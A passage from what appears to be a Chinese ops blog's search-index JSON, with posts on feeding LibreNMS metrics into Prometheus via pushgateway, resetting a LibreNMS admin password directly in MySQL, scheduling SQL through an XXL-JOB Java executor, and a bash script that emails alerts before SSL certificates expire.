systemctl enable --now pushgateway.service 二、配置librenms\ncd /opt/librenms vi config.php $config[\u0026#39;prometheus\u0026#39;][\u0026#39;enable\u0026#39;] = true; $config[\u0026#39;prometheus\u0026#39;][\u0026#39;url\u0026#39;] = \u0026#39;http://127.0.0.1:50004\u0026#39;; $config[\u0026#39;prometheus\u0026#39;][\u0026#39;job\u0026#39;] = \u0026#39;librenms\u0026#39;; # Optional 三、配置prometheus\n- job_name: \u0026#39;librenms\u0026#39; scrape_interval: 300s honor_labels: true static_configs: - targets: [\u0026#39;172.18.31.10:50004\u0026#39;] labels: sms_to: \u0026#39;18618197196\u0026#39; 首先访问prometheus，http://172.18.31.8:9090/targets\n这样弄好后，再访问 http://172.18.31.10:50004/metrics\n里面的东西是十分癫狂的，从交换机端口到F5，应有尽有\n东西收进prometheus后，可以通过grafana对各种指标进行画图和报警\n","permalink":"https://rendoumi.com/posts/20231213-librenms_prometheus/","summary":"\u003cp\u003elibrenms是个非常强悍的工具，对网络不清楚的可以透过这个工具，对网络环境有清晰的了解。\u003c/p\u003e\n\u003cp\u003e如何通过prometheus对librenms进行集成呢？\u003c/p\u003e\n\u003cp\u003e一、装pushgateway\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/prometheus/pushgateway/releases/download/v1.2.0/pushgateway-1.2.0.linux-amd64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e把pushgateway放到/usr/local/bin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt;/etc/systemd/system/pushgateway.service \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Unit]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eDescription=Codis Exporter\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWants=network-online.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eAfter=network-online.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Service]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eType=simple\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStart=/usr/local/bin/pushgateway --web.listen-address=:50004\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Install]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWantedBy=multi-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl daemon-relaod\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e --now pushgateway.service\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e二、配置librenms\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /opt/librenms\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi config.php\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;prometheus\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;enable\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e true\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;prometheus\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;url\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;http://127.0.0.1:50004\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;prometheus\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;job\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;librenms\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Optional\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e三、配置prometheus\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- job_name: \u003cspan class=\"s1\"\u003e\u0026#39;librenms\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  scrape_interval: 300s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  honor_labels: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  static_configs:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    - targets: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;172.18.31.10:50004\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      labels:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        sms_to: \u003cspan class=\"s1\"\u003e\u0026#39;18618197196\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e首先访问prometheus，http://172.18.31.8:9090/targets\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231213-librenms_prometheus/2020-07-02_152912.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这样弄好后，再访问 http://172.18.31.10:50004/metrics\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231213-librenms_prometheus/2020-07-02_152550.png\"\u003e\u003c/p\u003e\n\u003cp\u003e里面的东西是十分癫狂的，从交换机端口到F5，应有尽有\u003c/p\u003e\n\u003cp\u003e东西收进prometheus后，可以通过grafana对各种指标进行画图和报警\u003c/p\u003e","title":"Librenms集成进prometheus"},{"content":"librenms对密码的强度有要求，必须使用非常复杂的密码策略才能满足要求. 这就鬼畜了，想改成至少能记得住的密码。\n如何强制修改呢？\n首先弄一段php程序来生成加密串：\n\u0026lt;?php\recho password_hash(\u0026quot;xxxxxxxx\u0026quot;, PASSWORD_DEFAULT);\r?\u0026gt;\r运行后得到加密的字符串：\n$2y$10$EUvwg5kVGXQUPBw4obdPJ.AKCSVgu8ximyyoFKW7hXed0s.sh/ud6\r或者直接到下面的网站来生成：\nhttps://phppasswordhash.com/\n然后登录librenms的机器, 172.18.31.10\nmysql -uroot -p\ruse librenms;\rselect * from users;\rupdate users set password='$2y$10$EUvwg5kVGXQUPBw4obdPJ.AKCSVgu8ximyyoFKW7hXed0s.sh/ud6' where user_id=1;\r这样就强制把密码修改成自己习惯的了。\n","permalink":"https://rendoumi.com/posts/20231213-librenms_password/","summary":"\u003cp\u003elibrenms对密码的强度有要求，必须使用非常复杂的密码策略才能满足要求. 这就鬼畜了，想改成至少能记得住的密码。\u003c/p\u003e\n\u003cp\u003e如何强制修改呢？\u003c/p\u003e\n\u003cp\u003e首先弄一段php程序来生成加密串：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;?php\r\necho password_hash(\u0026quot;xxxxxxxx\u0026quot;, PASSWORD_DEFAULT);\r\n?\u0026gt;\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e运行后得到加密的字符串：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e$2y$10$EUvwg5kVGXQUPBw4obdPJ.AKCSVgu8ximyyoFKW7hXed0s.sh/ud6\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e或者直接到下面的网站来生成：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://phppasswordhash.com/\"\u003ehttps://phppasswordhash.com/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e然后登录librenms的机器, 172.18.31.10\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003emysql -uroot -p\r\nuse librenms;\r\nselect * from users;\r\nupdate users set password='$2y$10$EUvwg5kVGXQUPBw4obdPJ.AKCSVgu8ximyyoFKW7hXed0s.sh/ud6' where user_id=1;\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这样就强制把密码修改成自己习惯的了。\u003c/p\u003e","title":"Librenms强制修改密码"},{"content":"数据库管理员有个特殊的需求：\n需要一个msyql客户端，可以定时去连接mysql服务器执行SQL语句。且可以自己动态编辑SQL语句。\n找来找去，数据库管理员对spring java这类东西吧一无所知，但是通晓SQL，这种情形XXL-JOB的EXECUTOR代位执行就比较适合。\n主控地址：http://172.18.31.13/xxl-job-admin/\n使用很简单，我们在172.18.31.14装一个被控端的executor，运行模式选择GLUE(Java)模式，GLUE模式就可以随便编辑 JAVA+SQL源代码了。设置执行频率是每30分钟执行一次。\n选择GLUE模式后，我们就可以在GLUE IDE里编辑代码：\n代码如下： 注：在172.18.31.14上面已经装了一个MySQL服务端，有一个user库。\npackage com.xxl.job.service.handler;\rimport com.xxl.job.core.context.XxlJobHelper;\rimport com.xxl.job.core.handler.IJobHandler;\rimport org.springframework.jdbc.core.JdbcTemplate;\rimport org.springframework.jdbc.datasource.DriverManagerDataSource;\rpublic class DemoGlueJobHandler extends IJobHandler {\r@Override\rpublic void execute() throws Exception {\rDriverManagerDataSource ds = new DriverManagerDataSource();\rds.setDriverClassName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;);\rds.setUrl(\u0026#34;jdbc:mysql://localhost:3306/users?characterEncoding=UTF-8\u0026amp;useSSL=false\u0026#34;);\rds.setUsername(\u0026#34;root\u0026#34;);\rds.setPassword(\u0026#34;xxxxxxxx\u0026#34;);\rJdbcTemplate jdbcTemplate = new JdbcTemplate();\rjdbcTemplate.setDataSource(ds);\rList rows = jdbcTemplate.queryForList(\u0026#34;select * from user\u0026#34;); Iterator it = rows.iterator(); while(it.hasNext()) { Map userMap = (Map) it.next(); XxlJobHelper.log(userMap.get(\u0026#34;id\u0026#34;) + \u0026#34;\\t\u0026#34;); XxlJobHelper.log(userMap.get(\u0026#34;name\u0026#34;) + \u0026#34;\\t\u0026#34;); } XxlJobHelper.log(\u0026#34;XXL-JOB guning, Hello World.\u0026#34;);\r}\r} 为了实现mysql客户端可以对MySQL进行读写，我们需要在xxl-job的xxl-job-executor-sample-springboot示例项目中，pom.xml中增加spring-jdbc和mysql-connector-java的jar包部分。打出一个xxl-job的executor的执行端程序。\n代码在 /root/xxl-job-2.3.0/xxl-job-executor-samples/xxl-job-executor-sample-springboot目录下，用mvn package就可以打出xxl-job-executor-sample-springboot-2.3.0.jar包。\n\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;spring-jdbc\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;4.3.2.RELEASE\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt;\r\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;${mysql-connector-java.version}\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt; 启动agent的systemd服务脚本，/etc/systemd/system/xxljob-agent.service\n[Unit] After=network.target Wants=network.target [Service] WorkingDirectory=/usr/local/bin\rType=simple ExecStart=/usr/bin/java -jar /usr/local/bin/xxl-job-executor-sample-springboot-2.3.0.jar\rRestart=on-failure [Install] WantedBy=multi-user.target 这样就OK了。\n","permalink":"https://rendoumi.com/posts/20231212-xxl-job/","summary":"\u003cp\u003e数据库管理员有个特殊的需求：\u003c/p\u003e\n\u003cp\u003e需要一个msyql客户端，可以定时去连接mysql服务器执行SQL语句。且可以自己动态编辑SQL语句。\u003c/p\u003e\n\u003cp\u003e找来找去，数据库管理员对spring java这类东西吧一无所知，但是通晓SQL，这种情形XXL-JOB的EXECUTOR代位执行就比较适合。\u003c/p\u003e\n\u003cp\u003e主控地址：http://172.18.31.13/xxl-job-admin/\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231212-xxl-job/2022-02-07_091252.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用很简单，我们在172.18.31.14装一个被控端的executor，运行模式选择GLUE(Java)模式，GLUE模式就可以随便编辑 JAVA+SQL源代码了。设置执行频率是每30分钟执行一次。\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231212-xxl-job/2022-02-07_091351.png\"\u003e\u003c/p\u003e\n\u003cp\u003e选择GLUE模式后，我们就可以在GLUE IDE里编辑代码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231212-xxl-job/2022-02-07_091558.png\"\u003e\u003c/p\u003e\n\u003cp\u003e代码如下：\n注：在172.18.31.14上面已经装了一个MySQL服务端，有一个user库。\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003epackage com.xxl.job.service.handler;\r\n\r\nimport com.xxl.job.core.context.XxlJobHelper;\r\nimport com.xxl.job.core.handler.IJobHandler;\r\nimport org.springframework.jdbc.core.JdbcTemplate;\r\nimport org.springframework.jdbc.datasource.DriverManagerDataSource;\r\n\r\npublic class DemoGlueJobHandler extends IJobHandler {\r\n\r\n\t@Override\r\n\tpublic void execute() throws Exception {\r\n\r\n        DriverManagerDataSource ds = new DriverManagerDataSource();\r\n        ds.setDriverClassName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;);\r\n        ds.setUrl(\u0026#34;jdbc:mysql://localhost:3306/users?characterEncoding=UTF-8\u0026amp;useSSL=false\u0026#34;);\r\n        ds.setUsername(\u0026#34;root\u0026#34;);\r\n        ds.setPassword(\u0026#34;xxxxxxxx\u0026#34;);\r\n\r\n        JdbcTemplate jdbcTemplate = new JdbcTemplate();\r\n        jdbcTemplate.setDataSource(ds);\r\n      \r\n\r\n        List rows = jdbcTemplate.queryForList(\u0026#34;select * from user\u0026#34;); \r\n        Iterator it = rows.iterator(); \r\n        while(it.hasNext()) { \r\n            Map userMap = (Map) it.next(); \r\n            XxlJobHelper.log(userMap.get(\u0026#34;id\u0026#34;) + \u0026#34;\\t\u0026#34;); \r\n            XxlJobHelper.log(userMap.get(\u0026#34;name\u0026#34;) + \u0026#34;\\t\u0026#34;); \r\n        } \r\n      \r\n        XxlJobHelper.log(\u0026#34;XXL-JOB guning, Hello World.\u0026#34;);\r\n\t}\r\n\r\n  \r\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e为了实现mysql客户端可以对MySQL进行读写，我们需要在xxl-job的xxl-job-executor-sample-springboot示例项目中，pom.xml中增加spring-jdbc和mysql-connector-java的jar包部分。打出一个xxl-job的executor的执行端程序。\u003c/p\u003e","title":"xxl-job的动态编辑并执行java脚本"},{"content":"证书会经常面临过期而没有及时续费的情况，写个脚本提醒一下自己吧：\ncrontab -l\n0 8 * * * /usr/local/bin/check_ssl.sh www.ddky.com\rcheck_ssl.sh的内容：\n#!/bin/bash # Print the number of days till certificate expiration # # Example: # $ check_cert.sh sleeplessbeastie.eu # 81 # $ check_cert.sh lwn.net # 630 # # Exit codes: # 0 - certificate is not expired # 1 - certificate is expired # 254 - certificate is empty # 255 - DNS resolution failed # # temporary file to store certificate certificate_file=$(mktemp) # delete temporary file on exit trap \u0026#34;unlink $certificate_file\u0026#34; EXIT if [ \u0026#34;$#\u0026#34; -eq \u0026#34;1\u0026#34; ]; then website=\u0026#34;$1\u0026#34; host \u0026#34;$website\u0026#34; \u0026gt;\u0026amp;- if [ \u0026#34;$?\u0026#34; -eq \u0026#34;0\u0026#34; ]; then echo -n | openssl s_client -servername \u0026#34;$website\u0026#34; -connect \u0026#34;$website\u0026#34;:443 2\u0026gt;/dev/null | sed -ne \u0026#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p\u0026#39; \u0026gt; $certificate_file certificate_size=$(stat -c \u0026#34;%s\u0026#34; $certificate_file) if [ \u0026#34;$certificate_size\u0026#34; -gt \u0026#34;1\u0026#34; ]; then date=$(openssl x509 -in $certificate_file -enddate -noout | sed \u0026#34;s/.*=\\(.*\\)/\\1/\u0026#34;) date_s=$(date -d \u0026#34;${date}\u0026#34; +%s) now_s=$(date -d now +%s) date_diff=$(( (date_s - now_s) / 86400 )) echo \u0026#34;$date_diff\u0026#34; if [ \u0026#34;$date_diff\u0026#34; -le 37 ]; then /usr/local/bin/mailsend -q -to \u0026#34;zhangranrui@ddky.com\u0026#34; -from monit@ddky.com -ssl -port 465 -auth -auth-plan -smtp smtp.exmail.qq.com -sub \u0026#34;证书就要到期了\u0026#34; -v -user \u0026#34;monit@ddky.com\u0026#34; -pass \u0026#34;xxxxxxxx\u0026#34; -cs \u0026#34;utf-8\u0026#34; -enc-type \u0026#34;base64\u0026#34; -M \u0026#34;$website 还有 $date_diff 天就要到期了！！！\u0026#34; fi if [ \u0026#34;$date_s\u0026#34; -gt \u0026#34;$now_s\u0026#34; ]; then exit 0 # ok else exit 1 # not ok fi else exit 254 fi else exit 255 fi fi ","permalink":"https://rendoumi.com/posts/20231212-check_ssl/","summary":"\u003cp\u003e证书会经常面临过期而没有及时续费的情况，写个脚本提醒一下自己吧：\u003c/p\u003e\n\u003cp\u003ecrontab -l\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e0 8 * * * /usr/local/bin/check_ssl.sh www.ddky.com\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003echeck_ssl.sh的内容：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e# Print the number of days till certificate expiration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Example:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   $ check_cert.sh sleeplessbeastie.eu\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   81\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   $ check_cert.sh lwn.net\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   630\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Exit codes:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   0   - certificate is not expired\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   1   - certificate is     expired\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   254 - certificate is empty\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   255 - DNS resolution failed\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# temporary file to store certificate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ecertificate_file\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003emktemp\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# delete temporary file on exit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003etrap\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;unlink \u003c/span\u003e\u003cspan class=\"nv\"\u003e$certificate_file\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e EXIT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$#\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -eq \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nv\"\u003ewebsite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  host \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$website\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e-\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$?\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -eq \u003cspan class=\"s2\"\u003e\u0026#34;0\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e -n \u003cspan class=\"p\"\u003e|\u003c/span\u003e openssl s_client -servername \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$website\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -connect \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$website\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e:443 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed -ne \u003cspan class=\"s1\"\u003e\u0026#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p\u0026#39;\u003c/span\u003e \u0026gt; \u003cspan class=\"nv\"\u003e$certificate_file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ecertificate_size\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003estat -c \u003cspan class=\"s2\"\u003e\u0026#34;%s\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$certificate_file\u003c/span\u003e\u003cspan 